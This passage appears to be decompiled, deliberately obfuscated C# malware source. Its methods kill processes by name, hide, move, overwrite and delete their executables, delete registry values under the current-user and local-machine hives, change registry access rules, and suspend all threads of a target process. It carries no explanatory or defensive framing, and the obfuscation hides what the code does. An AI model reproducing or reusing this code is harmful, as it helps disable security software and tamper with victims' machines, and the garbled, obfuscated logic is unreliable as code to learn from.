						hBveoeihUogCBZztXIbZbUzflDpXA += _003CModule_003E.WgpDFIDBthfUHHPzdxdaGkTjtimi<int>(3673226060u);
						num23 = ((int)num3 * -1582160881) ^ 0x4DD06FC9;
						continue;
					case 7u:
						num23 = ((int)num3 * -623120868) ^ 0x3713E60F;
						continue;
					case 6u:
						num24 = _003CModule_003E.MikTwNgIBVHjEMLNTODKmzpCiqin<int>(1546912917u);
						num23 = (int)(num3 * 1711786968) ^ -1721279221;
						continue;
					case 5u:
						xwGXuordbbhlvcLYTAexcAjaVxBbB(_003CModule_003E.DUuMrhCbuZnoxVHKGrXPrcspoeTr<string>(325076000u), _003CModule_003E.ODkbfxpVhRhqGtIspNCsSBULKrV<string>(2435883181u), text4);
						num23 = (int)((num3 * 103407079) ^ 0x66B0C56F);
						continue;
					case 3u:
					{
						int num27;
						int num28;
						if (DobYDSwkSrXkWkMLTOdyziWQylRk.itJjvSZwsfodmEwVRhhoXpqArxdq(DobYDSwkSrXkWkMLTOdyziWQylRk.lZGpJVuqLkJZdEqSnBMtIoKSkPtu(DobYDSwkSrXkWkMLTOdyziWQylRk.xaMjkLUfikFaJFkBNxkKCWvXRfeV(registryKey_4, text4)), string_1))
						{
							num27 = -119184853;
							num28 = -119184853;
						}
						else
						{
							num27 = 544295880;
							num28 = 544295880;
						}
						num23 = num27 ^ (int)(num3 * 493394755);
						continue;
					}
					case 2u:
					{
						int num25;
						int num26;
						if (DobYDSwkSrXkWkMLTOdyziWQylRk.dfpCPQsBDRRZLGbkNCFwbocYRqSeb(text4, awaaxsybNLyafPEOFvaILTvtSRU.utZEkoevwRvsmxDkvGZTUlCMkKmv))
						{
							num25 = 29561579;
							num26 = 29561579;
						}
						else
						{
							num25 = 1879171315;
							num26 = 1879171315;
						}
						num23 = num25 ^ (int)(num3 * 576137351);
						continue;
					}
					case 1u:
						num24 += _003CModule_003E.WgpDFIDBthfUHHPzdxdaGkTjtimi<int>(3673226060u);
						num23 = 1351614603;
						continue;
					default:
						return;
					case 4u:
						break;
					case 0u:
						return;
					}
					break;
				}
			}
		}
		catch
		{
		}
	}

	public static void CbklMWKbwqCGRHHCnOMjLLgkhtgb(string string_0)
	{
		try
		{
			SecurityIdentifier identityReference_ = DobYDSwkSrXkWkMLTOdyziWQylRk.yxevsGwwrHlNkZiYriGwATtuigyq((WellKnownSidType)_003CModule_003E.sqPVKnDZOQggfizDoCDEcDgwRZtQ<int>(3615143063u), (SecurityIdentifier)null);
			NTAccount object_ = DobYDSwkSrXkWkMLTOdyziWQylRk.zSyZyHdsaZbMGWGSVXFKioorFtoeA((IdentityReference)identityReference_, DobYDSwkSrXkWkMLTOdyziWQylRk.QIxrrmCBJSifDJwSdxARgEynLIAoA(typeof(NTAccount).TypeHandle)) as NTAccount;
			RegistryKey registryKey = DobYDSwkSrXkWkMLTOdyziWQylRk.VejfGRlVJYEyVmwcMKhQuboNDCYg(Registry.CurrentUser, _003CModule_003E.JNSQYZLYsqATUsJkEIlLGVFqNhzeb<string>(2755694182u), (byte)_003CModule_003E.hywSkonEwbWqVJvdXIANcTkCRCmp<int>(3350669611u) != 0);
			try
			{
				RegistrySecurity registrySecurity_ = DobYDSwkSrXkWkMLTOdyziWQylRk.GADziRftrMneculrlJnGpDdmBRiD(registryKey);
				RegistryAccessRule registryAccessRule_ = DobYDSwkSrXkWkMLTOdyziWQylRk.shoNxwREMOslbehfCPeyTGpAhoOx(DobYDSwkSrXkWkMLTOdyziWQylRk.lZGpJVuqLkJZdEqSnBMtIoKSkPtu((object)object_), (RegistryRights)_003CModule_003E.rvbUTwHOsmcNBcQsYgfyxVYsWwJg<int>(4078703004u), (InheritanceFlags)_003CModule_003E.dpxHirlQuRSzbXiBGQArohLuCnMj<int>(906383712u), (PropagationFlags)_003CModule_003E.WgpDFIDBthfUHHPzdxdaGkTjtimi<int>(732702483u), (AccessControlType)_003CModule_003E.YldckkxrnqITblrqfUdHgXoRQPFq<int>(2830137045u));
				DobYDSwkSrXkWkMLTOdyziWQylRk.OhQzQgtduzFkHgoOdRmsGwAjSvrv(registrySecurity_, registryAccessRule_);
				DobYDSwkSrXkWkMLTOdyziWQylRk.WOxslLOMPulmXDFMmRFyNbmwBFpi(registryKey, registrySecurity_);
			}
			finally
			{
				if (registryKey != null)
				{
					while (true)
					{
						IL_00dc:
						int num = -392609928;
						while (true)
						{
							int num2 = num;
							uint num3;
							switch ((num3 = (uint)(~(~((num2 ^ -1233617395) - -1970823277)) + 910528255)) % 3u)
							{
							case 1u:
								goto IL_0098;
							default:
								goto end_IL_00ac;
							case 0u:
								break;
							case 2u:
								goto end_IL_00ac;
							}
							goto IL_00dc;
							IL_0098:
							DobYDSwkSrXkWkMLTOdyziWQylRk.zRJnIpSuzoYZXGRVQiBqFZDLEXVH((IDisposable)registryKey);
							num = (int)((num3 * 795965148) ^ 0x671C17FD);
							continue;
							end_IL_00ac:
							break;
						}
						break;
					}
				}
			}
		}
		catch
		{
		}
	}

	public static void xwGXuordbbhlvcLYTAexcAjaVxBbB(string string_0, string string_1, string string_2)
	{
		try
		{
			RegistryKey registryKey = default(RegistryKey);
			while (true)
			{
				int num = 1482268615;
				while (true)
				{
					int num2 = num;
					uint num3;
					switch ((num3 = (uint)(-(~num2 ^ -1962037286) - -394922136 - -713672280)) % 5u)
					{
					case 3u:
					{
						registryKey = null;
						int num6;
						int num7;
						if (DobYDSwkSrXkWkMLTOdyziWQylRk.qtPeJpWdXwQjmSMwzisfvLfGYANh(string_0, _003CModule_003E.YldckkxrnqITblrqfUdHgXoRQPFq<string>(2564016991u)))
						{
							num6 = -2107420168;
							num7 = -2107420168;
						}
						else
						{
							num6 = -1194209788;
							num7 = -1194209788;
						}
						num = num6 ^ (int)(num3 * 1452023875);
						continue;
					}
					case 1u:
						registryKey = DobYDSwkSrXkWkMLTOdyziWQylRk.VejfGRlVJYEyVmwcMKhQuboNDCYg(Registry.LocalMachine, string_1, (byte)_003CModule_003E.xjxQUSvjJuxTPiElWBJfzVfPzOZv<int>(3992168967u) != 0);
						num = 1377079316;
						continue;
					case 0u:
						registryKey = DobYDSwkSrXkWkMLTOdyziWQylRk.VejfGRlVJYEyVmwcMKhQuboNDCYg(Registry.CurrentUser, string_1, (byte)_003CModule_003E.EOwkCftCumriwZFLeBeAujknGJby<int>(2360121032u) != 0);
						num = (int)((num3 * 990170800) ^ 0x75943124);
						continue;
					case 4u:
						break;
					default:
					{
						RegistryKey registryKey2 = registryKey;
						try
						{
							if (registryKey == null)
							{
								return;
							}
							while (true)
							{
								int num4 = 1365263327;
								while (true)
								{
									num2 = num4;
									switch ((num3 = (uint)(-(~num2 ^ -1962037286) - -394922136 - -713672280)) % 3u)
									{
									case 1u:
										goto IL_00c1;
									default:
										return;
									case 2u:
										break;
									case 0u:
										return;
									}
									break;
									IL_00c1:
									DobYDSwkSrXkWkMLTOdyziWQylRk.yzTgAVkeSbArTbNPSoxAbYPdLeoXB(registryKey, string_2);
									num4 = ((int)num3 * -447178211) ^ 0x3122F1DD;
								}
							}
						}
						finally
						{
							if (registryKey2 != null)
							{
								while (true)
								{
									IL_0154:
									int num5 = 1509412471;
									while (true)
									{
										num2 = num5;
										switch ((num3 = (uint)(-(~num2 ^ -1962037286) - -394922136 - -713672280)) % 3u)
										{
										case 1u:
											goto IL_0112;
										default:
											goto end_IL_0125;
										case 2u:
											break;
										case 0u:
											goto end_IL_0125;
										}
										goto IL_0154;
										IL_0112:
										DobYDSwkSrXkWkMLTOdyziWQylRk.zRJnIpSuzoYZXGRVQiBqFZDLEXVH((IDisposable)registryKey2);
										num5 = ((int)num3 * -1739776962) ^ 0x78BA204A;
										continue;
										end_IL_0125:
										break;
									}
									break;
								}
							}
						}
					}
					}
					break;
				}
			}
		}
		catch
		{
		}
	}

	public static void NZpWvxqwYTkJAOXSEyAVCFwbDNnC(string string_0, string string_1, int int_0)
	{
		//IL_0156: Incompatible stack heights: 0 vs 1
		//IL_015d: Incompatible stack heights: 0 vs 1
		Process[] array = DobYDSwkSrXkWkMLTOdyziWQylRk.fmEOCrZpVQeVjJsbWiOTqLUbNsTq(string_0);
		int num = _003CModule_003E.YldckkxrnqITblrqfUdHgXoRQPFq<int>(723557330u);
		int num2 = 606214233;
		uint num3 = 1240114268u;
		while (true)
		{
			if (num < array.Length)
			{
				Process process_ = array[num];
				try
				{
					DobYDSwkSrXkWkMLTOdyziWQylRk.PgIIlDyttuTHpYlLQAmvCBvzyVMaA(process_);
					Random random_ = DobYDSwkSrXkWkMLTOdyziWQylRk.mPcEARhasEyECOncekoNGGMhcLhkA();
					DobYDSwkSrXkWkMLTOdyziWQylRk.FakxjOeNxragyKrZUTXpGKeuElyw(string_1, (FileAttributes)_003CModule_003E.rvbUTwHOsmcNBcQsYgfyxVYsWwJg<int>(3567895463u));
					try
					{
						File.Move(string_1, DobYDSwkSrXkWkMLTOdyziWQylRk.pAGgfPLCwNQubndFoPWBonCRUklo(_003CModule_003E.dpxHirlQuRSzbXiBGQArohLuCnMj<string>(3690846845u)) + _003CModule_003E.YldckkxrnqITblrqfUdHgXoRQPFq<string>(1868921785u) + DobYDSwkSrXkWkMLTOdyziWQylRk.ncEQfsIYBOReBmfEjOHhjKdmnUao(random_, _003CModule_003E.hywSkonEwbWqVJvdXIANcTkCRCmp<int>(3322908568u), _003CModule_003E.rvbUTwHOsmcNBcQsYgfyxVYsWwJg<int>(2306508878u)));
						while (true)
						{
							IL_0102:
							int num4 = -163239982;
							while (true)
							{
								num2 = num4;
								switch ((num3 = (uint)(-(-245959644 - num2) + 1721429778 - 1333489387)) % 4u)
								{
								case 3u:
									File.Delete(string_1);
									num4 = (int)((num3 * 1121292486) ^ 0xB55EB09);
									continue;
								case 1u:
									File.WriteAllText(string_1, _003CModule_003E.UWUPlzHonxoEQOBrGBfeIrtuHJlIb<string>(179562441u));
									nWhDOmhZFUIjakbGwviSQtcCqtvd(string_1);
									num4 = (int)(num3 * 2031510978) ^ -25061402;
									continue;
								default:
									goto end_IL_00cf;
								case 0u:
									break;
								case 2u:
									goto end_IL_00cf;
								}
								goto IL_0102;
								continue;
								end_IL_00cf:
								break;
							}
							break;
						}
					}
					catch (Exception ex)
					{
						while (true)
						{
							IL_0158:
							_ = 1239658652;
							while (true)
							{
								num2 = (int)/*Error near IL_0110: Stack underflow*/;
								switch ((num3 = (uint)(-(-245959644 - num2) + 1721429778 - 1333489387)) % 3u)
								{
								default:
									goto end_IL_010e;
								case 1u:
									Console.WriteLine(ex.Message);
									_ = (num3 * 96716270) ^ 0x5BD9FFDD;
									continue;
								case 2u:
									break;
								case 0u:
									goto end_IL_010e;
								}
								goto IL_0158;
								continue;
								end_IL_010e:
								break;
							}
							break;
						}
					}
					gPoEzgcIoDDzseQakDHCsevAUDwhb += _003CModule_003E.WgpDFIDBthfUHHPzdxdaGkTjtimi<int>(3673226060u);
					while (true)
					{
						IL_01ca:
						int num5 = 493357667;
						while (true)
						{
							num2 = num5;
							switch ((num3 = (uint)(-(-245959644 - num2) + 1721429778 - 1333489387)) % 3u)
							{
							case 1u:
								goto IL_0178;
							default:
								goto end_IL_019b;
							case 0u:
								break;
							case 2u:
								goto end_IL_019b;
							}
							goto IL_01ca;
							IL_0178:
							staLrosdvPFQUCRrMpxjudrHGeql += _003CModule_003E.YldckkxrnqITblrqfUdHgXoRQPFq<int>(2830137045u);
							num5 = ((int)num3 * -1112827245) ^ -1420376830;
							continue;
							end_IL_019b:
							break;
						}
						break;
					}
				}
				catch
				{
				}
				num += _003CModule_003E.xjxQUSvjJuxTPiElWBJfzVfPzOZv<int>(3992168967u);
				goto IL_01d6;
			}
			int num6 = -377255050;
			goto IL_01db;
			IL_01db:
			num2 = num6;
			switch ((num3 = (uint)(-(-245959644 - num2) + 1721429778 - 1333489387)) % 3u)
			{
			case 2u:
				break;
			case 0u:
				goto IL_01d6;
			default:
				return;
			case 1u:
				return;
			}
			continue;
			IL_01d6:
			num6 = 599039805;
			goto IL_01db;
		}
	}

	public static void zWtyKMyOgJNwihhWkJkzXEXxifHp(int int_0)
	{
		try
		{
			Process process = DobYDSwkSrXkWkMLTOdyziWQylRk.yFWzcpahXXbOeqdnFxcHVVJxDNRs(int_0);
			try
			{
				if (DobYDSwkSrXkWkMLTOdyziWQylRk.qtPeJpWdXwQjmSMwzisfvLfGYANh(DobYDSwkSrXkWkMLTOdyziWQylRk.QeScWBDMvZcGIFNjGujcopUwwPnCA(process), string.Empty))
				{
					int num = 1390753508;
					uint num2 = 651663653u;
					return;
				}
				IEnumerator enumerator = DobYDSwkSrXkWkMLTOdyziWQylRk.QWhMpSfwqDMKYiJbhIvptyxpqjSw((ReadOnlyCollectionBase)DobYDSwkSrXkWkMLTOdyziWQylRk.rdPrXuSEzYRhGsXOsfZpjeEJbeeU(process));
				try
				{
					IntPtr intPtr = default(IntPtr);
					while (true)
					{
						int num3;
						int num4;
						if (!DobYDSwkSrXkWkMLTOdyziWQylRk.StpKRaWENMZwBcHscfsaxdSHAlWv(enumerator))
						{
							num3 = 2141619462;
							num4 = 2141619462;
						}
						else
						{
							num3 = -1205978612;
							num4 = -1205978612;
						}
						while (true)
						{
							int num = num3;
							uint num2;
							switch ((num2 = (uint)(~((~(num * -12267025) * 104170361) ^ -2111616943))) % 6u)
							{
							case 4u:
								uuaAjCUSpsHfFdFxDHJGvZnsQiqJA.SuspendThread(intPtr);
								num3 = ((int)num2 * -1544827920) ^ -1422120422;
								continue;
							case 3u:
							{
								ProcessThread processThread_ = (ProcessThread)DobYDSwkSrXkWkMLTOdyziWQylRk.JDKDzsxYFSYzqMHfLvyLTnESJSqh(enumerator);
								intPtr = uuaAjCUSpsHfFdFxDHJGvZnsQiqJA.OpenThread((uuaAjCUSpsHfFdFxDHJGvZnsQiqJA.PMvuqcBfUwPdXoPgCDWDCIVxIDIf)_003CModule_003E.hywSkonEwbWqVJvdXIANcTkCRCmp<int>(3976470309u), (byte)_003CModule_003E.UWUPlzHonxoEQOBrGBfeIrtuHJlIb<int>(1055538579u) != 0, (uint)DobYDSwkSrXkWkMLTOdyziWQylRk.xNRuvboTGSysZwVSJOhcZznhDjZJ(processThread_));
								num3 = -1712882769;
								continue;
							}
							case 2u:
							{
								int num5;
								int num6;
								if (!(intPtr == IntPtr.Zero))
								{
									num5 = 1162671479;
									num6 = 1162671479;
								}
								else
								{
									num5 = -1797835258;
									num6 = -1797835258;
								}
								num3 = num5 ^ ((int)num2 * -1576505367);
								continue;
							}
							case 0u:
								num3 = -1205978612;
								continue;
							default:
								return;
							case 1u:
								break;
							case 5u:
								return;
							}
							break;
						}
					}
				}
				finally
				{
					if (enumerator is IDisposable idisposable_)
					{
						while (true)
						{
							IL_0176:
							int num7 = 164950238;
							while (true)
							{
								int num = num7;
								uint num2;
								switch ((num2 = (uint)(~((~(num * -12267025) * 104170361) ^ -2111616943))) % 3u)
								{
								case 1u:
									goto IL_0131;
								default:
									goto end_IL_0146;
								case 2u:
									break;
								case 0u:
									goto end_IL_0146;
								}
								goto IL_0176;
								IL_0131:
								DobYDSwkSrXkWkMLTOdyziWQylRk.zRJnIpSuzoYZXGRVQiBqFZDLEXVH(idisposable_);
								num7 = ((int)num2 * -839339744) ^ 0x1489269B;
								continue;
								end_IL_0146:
								break;
							}
							break;
						}
					}
				}
			}
			finally
			{
				if (process != null)
				{
					while (true)
					{
						IL_01c9:
						int num8 = -445629697;
						while (true)
						{
							int num = num8;
							uint num2;
							switch ((num2 = (uint)(~((~(num * -12267025) * 104170361) ^ -2111616943))) % 3u)
							{
							case 1u:
								goto IL_0185;
							default:
								goto end_IL_0199;
							case 0u:
								break;
							case 2u:
								goto end_IL_0199;
							}
							goto IL_01c9;
							IL_0185:
							DobYDSwkSrXkWkMLTOdyziWQylRk.zRJnIpSuzoYZXGRVQiBqFZDLEXVH((IDisposable)process);
							num8 = ((int)num2 * -161781498) ^ 0x47FC48F8;
							continue;
							end_IL_0199:
							break;
						}
						break;
					}
				}
			}
		}
		catch
		{
		}
	}

	static Process[] LEkTJDnCJEONxFwfJktHTYxxFitK()
	{
		return Process.GetProcesses();
	}

	static ProcessModule lwcsJYjRdvKNexgIKOjTRsCovLCt(Process process_0)
	{
		return process_0.MainModule;
	}

	static string AtxNmqEYfgKOziCqHfaJQEuBLCJQ(ProcessModule processModule_0)
	{
		return processModule_0.FileName;
	}

	static string pAGgfPLCwNQubndFoPWBonCRUklo(string string_0)
	{
		return Environment.GetEnvironmentVariable(string_0);
	}

	static bool itJjvSZwsfodmEwVRhhoXpqArxdq(string string_0, string string_1)
	{
		return string_0.Contains(string_1);
	}

	static string QeScWBDMvZcGIFNjGujcopUwwPnCA(Process process_0)
	{
		return process_0.ProcessName;
	}

	static Process zsvcAmhuTnzoZsAlGIwweZFfZqukA()
	{
		return Process.GetCurrentProcess();
	}

	static bool dfpCPQsBDRRZLGbkNCFwbocYRqSeb(string string_0, string string_1)
	{
		return string_0 != string_1;
	}

	static IntPtr VGYBKHNjQGavcYUKveCNNLLDFLPY(Process process_0)
	{
		return process_0.MainWindowHandle;
	}

	static int dcDcGSBFYhroIMaFThAeISRDKkZhb(Process process_0)
	{
		return process_0.Id;
	}

	static string zlisMWMHjxgPXMcTmYXJywNRSsaR()
	{
		return Environment.UserName;
	}

	static string lZGpJVuqLkJZdEqSnBMtIoKSkPtu(object object_0)
	{
		return object_0.ToString();
	}

	static DirectoryInfo ElhdPtcMeMfmiYSuHdbslXHCRYBl(string string_0)
	{
		return new DirectoryInfo(string_0);
	}

	static DirectorySecurity vBVBneffumKuLugCYhPIUTKTCHtC()
	{
		return new DirectorySecurity();
	}

	static FileSystemAccessRule QNlfcAdHOtFiFPrbmgDLZGFLpUbL(string string_0, FileSystemRights fileSystemRights_0, InheritanceFlags inheritanceFlags_0, PropagationFlags propagationFlags_0, AccessControlType accessControlType_0)
	{
		return new FileSystemAccessRule(string_0, fileSystemRights_0, inheritanceFlags_0, propagationFlags_0, accessControlType_0);
	}

	static void kIXtNzgqZqSYWHVpTJTMyJndHwWHA(FileSystemSecurity fileSystemSecurity_0, FileSystemAccessRule fileSystemAccessRule_0)
	{
		fileSystemSecurity_0.AddAccessRule(fileSystemAccessRule_0);
	}

	static void cjeSGXMKuehJSleEhqeaalXFKekr(ObjectSecurity objectSecurity_0, bool bool_0, bool bool_1)
	{
		objectSecurity_0.SetAccessRuleProtection(bool_0, bool_1);
	}

	static void trsHuMhdbnLqZcXLoGIRXLYCkfjj(DirectoryInfo directoryInfo_0, DirectorySecurity directorySecurity_0)
	{
		directoryInfo_0.SetAccessControl(directorySecurity_0);
	}

	static RegistryKey iwoJgaiIGJpOYrCjykmxdOgESMyg(RegistryKey registryKey_0, string string_0)
	{
		return registryKey_0.OpenSubKey(string_0);
	}

	static string[] BdjBUbgJQepVwDQxerundBKeENLjb(RegistryKey registryKey_0)
	{
		return registryKey_0.GetValueNames();
	}

	static object xaMjkLUfikFaJFkBNxkKCWvXRfeV(RegistryKey registryKey_0, string string_0)
	{
		return registryKey_0.GetValue(string_0);
	}

	static SecurityIdentifier yxevsGwwrHlNkZiYriGwATtuigyq(WellKnownSidType wellKnownSidType_0, SecurityIdentifier securityIdentifier_0)
	{
		return new SecurityIdentifier(wellKnownSidType_0, securityIdentifier_0);
	}

	static Type QIxrrmCBJSifDJwSdxARgEynLIAoA(RuntimeTypeHandle runtimeTypeHandle_0)
	{
		return Type.GetTypeFromHandle(runtimeTypeHandle_0);
	}

	static IdentityReference zSyZyHdsaZbMGWGSVXFKioorFtoeA(IdentityReference identityReference_0, Type type_0)
	{
		return identityReference_0.Translate(type_0);
	}

	static RegistryKey VejfGRlVJYEyVmwcMKhQuboNDCYg(RegistryKey registryKey_0, string string_0, bool bool_0)
	{
		return registryKey_0.OpenSubKey(string_0, bool_0);
	}

	static RegistrySecurity GADziRftrMneculrlJnGpDdmBRiD(RegistryKey registryKey_0)
	{
		return registryKey_0.GetAccessControl();
	}

	static RegistryAccessRule shoNxwREMOslbehfCPeyTGpAhoOx(string string_0, RegistryRights registryRights_0, InheritanceFlags inheritanceFlags_0, PropagationFlags propagationFlags_0, AccessControlType accessControlType_0)
	{
		return new RegistryAccessRule(string_0, registryRights_0, inheritanceFlags_0, propagationFlags_0, accessControlType_0);
	}

	static void OhQzQgtduzFkHgoOdRmsGwAjSvrv(RegistrySecurity registrySecurity_0, RegistryAccessRule registryAccessRule_0)
	{
		registrySecurity_0.AddAccessRule(registryAccessRule_0);
	}

	static void WOxslLOMPulmXDFMmRFyNbmwBFpi(RegistryKey registryKey_0, RegistrySecurity registrySecurity_0)
	{
		registryKey_0.SetAccessControl(registrySecurity_0);
	}

	static void zRJnIpSuzoYZXGRVQiBqFZDLEXVH(IDisposable idisposable_0)
	{
		idisposable_0.Dispose();
	}

	static bool qtPeJpWdXwQjmSMwzisfvLfGYANh(string string_0, string string_1)
	{
		return string_0 == string_1;
	}

	static void yzTgAVkeSbArTbNPSoxAbYPdLeoXB(RegistryKey registryKey_0, string string_0)
	{
		registryKey_0.DeleteValue(string_0);
	}

	static Process[] fmEOCrZpVQeVjJsbWiOTqLUbNsTq(string string_0)
	{
		return Process.GetProcessesByName(string_0);
	}

	static void PgIIlDyttuTHpYlLQAmvCBvzyVMaA(Process process_0)
	{
		process_0.Kill();
	}

	static Random mPcEARhasEyECOncekoNGGMhcLhkA()
	{
		return new Random();
	}

	static void FakxjOeNxragyKrZUTXpGKeuElyw(string string_0, FileAttributes fileAttributes_0)
	{
		File.SetAttributes(string_0, fileAttributes_0);
	}

	static int ncEQfsIYBOReBmfEjOHhjKdmnUao(Random random_0, int int_0, int int_1)
	{
		return random_0.Next(int_0, int_1);
	}

	static Process yFWzcpahXXbOeqdnFxcHVVJxDNRs(int int_0)
	{
		return Process.GetProcessById(int_0);
	}

	static ProcessThreadCollection rdPrXuSEzYRhGsXOsfZpjeEJbeeU(Process process_0)
	{
		return process_0.Threads;
	}

	static IEnumerator QWhMpSfwqDMKYiJbhIvptyxpqjSw(ReadOnlyCollectionBase readOnlyCollectionBase_0)
	{
		return readOnlyCollectionBase_0.GetEnumerator();
	}

	static object JDKDzsxYFSYzqMHfLvyLTnESJSqh(IEnumerator ienumerator_0)
	{
		return ienumerator_0.Current;
	}

	static int xNRuvboTGSysZwVSJOhcZznhDjZJ(ProcessThread processThread_0)
	{
		return processThread_0.Id;
	}

	static bool StpKRaWENMZwBcHscfsaxdSHAlWv(IEnumerator ienumerator_0)
	{
		return ienumerator_0.MoveNext();
	}
}
